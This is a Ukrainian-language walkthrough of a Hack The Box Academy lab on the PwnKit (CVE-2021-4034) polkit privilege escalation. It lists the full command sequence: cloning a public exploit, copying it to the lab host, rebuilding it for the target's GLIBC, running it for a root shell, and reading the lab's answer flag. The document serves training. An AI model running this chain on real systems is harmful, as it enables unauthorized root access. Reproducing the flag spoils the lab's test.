## Polkit / PwnKit (CVE‑2021‑4034)

### Лінк

- [HTB Academy – Linux Privilege Escalation, Polkit](https://academy.hackthebox.com/app/module/51/section/1591) [intrusionz3r0.gitbook](https://intrusionz3r0.gitbook.io/intrusionz3r0/linux-penetration-testing/privilege-escalation/shared-object-hijacking)

### Тема уроку

Polkit (PwnKit, **CVE‑2021‑4034**) – локальний root‑прівеск через уразливість `pkexec`.

### Ціль

- Підготувати експлойт PwnKit (локально на Pwnbox із інтернетом).
- Перенести потрібні файли на ціль.
- Скомпілювати й запустити експлойт **на цілі** в її оточенні GLIBC.
- Отримати root‑shell та прочитати `/root/flag.txt`.

***

## Питання

- Які кроки **потрібні** для CVE‑2021‑4034 на HTB‑цілі?
- Які команди були зайві або помилкові (їх треба відкинути)?
- Як виглядає мінімальний робочий пайплайн: від `git clone` до `root`?

***

## Правильний ланцюжок кроків (без зайвого)

### 1. Підготовка експлойту на Pwnbox

На **Pwnbox** (де є інтернет):

```bash
cd /tmp
git clone https://github.com/berdav/CVE-2021-4034.git pwnkit
cd pwnkit
make
```

`make` робить:

```text
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
```

Корисні файли:

- `cve-2021-4034` – готовий експлойт (бінарник).
- `cve-2021-4034.c` – сирець, якщо треба перебілдити на цілі.
- `pwnkit.c`, `pwnkit.so`, `gconv-modules`, `Makefile` – допоміжні, потрібні `make` на цілі.

Ти зробив правильне:

```bash
scp cve-2021-4034 htb-student@10.129.205.113:/tmp/
scp cve-2021-4034.c htb-student@10.129.205.113:/tmp/
scp pwnkit.c htb-student@10.129.205.113:/tmp/
scp Makefile htb-student@10.129.205.113:/tmp/
scp gconv-modules htb-student@10.129.205.113:/tmp/
```

– це **вірні** команди переносу (ігноруємо тільки повторні `scp` з тією ж ціллю).

***

### 2. Робота на цілі (10.129.205.113)

SSH:

```bash
ssh htb-student@10.129.205.113
```

Перехід:

```bash
cd /tmp
```

Перевірка GLIBC (валідно, але не обов’язково для прівеску):

```bash
ldd --version
# ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31
```

Критичний момент – твій **перший** запуск скопійованого бінарника:

```bash
chmod +x cve-2021-4034
./cve-2021-4034
./cve-2021-4034: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./cve-2021-4034)
```

Це показує:

- скопійований `cve-2021-4034` зібраний **під іншу GLIBC** (наприклад, на системі з `GLIBC_2.34`), а ціль має лише `2.31`. [dev](https://dev.to/bitecode/how-to-get-glibc-version-c-lang-26he)

Тож **цей бінарник непридатний** – його треба **перезібрати на цілі**.

***

### 3. Правильний rebuild експлойту на цілі

Коректні кроки:

1. У каталозі `/tmp` вже є `cve-2021-4034.c`, `pwnkit.c`, `Makefile`, `gconv-modules` (ти їх переніс).

2. Виконуємо:

   ```bash
   make
   ```

   Тепер `make` збирає:

   ```text
   cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
   cc -Wall    cve-2021-4034.c   -o cve-2021-4034
   mkdir -p GCONV_PATH=.
   cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
   ```

   – ТУТ все ок: `cve-2021-4034` вже скомпільований **локальним gcc на цілі**, під її GLIBC (2.31). [tbhaxor](https://tbhaxor.com/exploiting-shared-library-misconfigurations/)

3. Перевіряємо список:

   ```bash
   ls
   # cve-2021-4034
   # cve-2021-4034.c
   # gconv-modules
   # 'GCONV_PATH=.'
   # Makefile
   # pwnkit.c
   # pwnkit.so
   # ...
   ```

4. Робимо бінарник виконуваним (якщо треба):

   ```bash
   chmod +x cve-2021-4034
   ```

5. Запускаємо:

   ```bash
   ./cve-2021-4034
   ```

   Результат:

   ```bash
   # whoami
   root
   ```

   – це **успішний прівеск через PwnKit** (CVE‑2021‑4034) на цілі. [tbhaxor](https://tbhaxor.com/exploiting-shared-library-misconfigurations/)

> Зайві/помилкові команди, які варто відкинути:
> - Повторні `chmod +x cve-2021-4034` та `./cve-2021-4034` ДО rebuild (`GLIBC_2.34 not found`) – це просто спроби, що падають через версію libc.
> - `git clone` на цілі (немає інтернету: `Could not resolve host: github.com`) – завжди роби `git clone` на Pwnbox і перенось файли через `scp`.

***

### 4. Пошук і читання флагу

У root‑шеллі:

```bash
# cd /root
# cat flag.txt
HTB{p0Lk1tt3n}
```

Флаг:

> `HTB{p0Lk1tt3n}`

***

## Шпаргалка: Polkit / PwnKit (CVE‑2021‑4034) – мінімальний пайплайн

**Тема уроку**

Polkit (PwnKit, CVE‑2021‑4034) – локальний root‑прівеск через уразливий `pkexec`.

**Ціль**

- Зрозуміти, що:
  - `pkexec` у вразливих версіях неправильно обробляє `argv` та `GCONV_PATH`; [intrusionz3r0.gitbook](https://intrusionz3r0.gitbook.io/intrusionz3r0/linux-penetration-testing/privilege-escalation/shared-object-hijacking)
  - можна змусити його завантажити підставну gconv‑бібліотеку (`pwnkit.so`) і виконати довільний код з root‑правами.

**Кроки (швидкий шаблон, без зайвого):**

1. На Pwnbox:

   ```bash
   cd /tmp
   git clone https://github.com/berdav/CVE-2021-4034.git pwnkit
   cd pwnkit
   make
   ```

2. Перенести файли на ціль:

   ```bash
   scp cve-2021-4034.c pwnkit.c Makefile gconv-modules htb-student@TARGET:/tmp/
   ```

3. На цілі:

   ```bash
   cd /tmp
   make    # rebuild під локальну GLIBC
   chmod +x cve-2021-4034
   ./cve-2021-4034
   # whoami -> root
   ```

4. Флаг:

   ```bash
   cd /root
   cat flag.txt
   ```
